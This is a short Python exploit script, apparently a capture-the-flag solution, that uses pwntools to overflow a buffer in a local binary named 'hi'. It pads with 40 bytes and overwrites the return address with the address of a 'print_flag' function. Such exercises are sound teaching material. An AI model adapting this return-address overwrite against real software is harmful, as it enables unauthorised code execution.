from pwn import *

elf = ELF("./hi")

target_address = p64(elf.symbols["print_flag"])

garbage=b"A"*40

payload = garbage + target_address

p = process('./hi')

p.sendline(payload)

msg = p.recvall()

print(msg)

